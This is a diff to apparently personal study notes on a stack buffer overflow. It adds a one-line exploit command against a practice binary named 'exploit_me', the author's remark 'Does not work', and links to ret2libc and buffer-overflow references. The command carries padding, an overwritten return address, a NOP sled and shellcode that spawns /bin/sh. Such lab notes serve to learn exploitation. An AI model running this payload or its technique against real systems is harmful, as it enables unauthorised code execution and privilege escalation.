@@ -1082,6 +1082,13 @@ The goal is to overwrite EIP with a new address that points to our shell code. T
 
 Buffer size = 112
 
+```
+./exploit_me $(python -c "print('\x41' * 112 + '\xd4\xf6\xff\xbf' + '\x90' * 100 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68//tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")
+```
+Does not work
+
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
 https://www.exploit-db.com/papers/13147
 
 https://web.ecs.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf
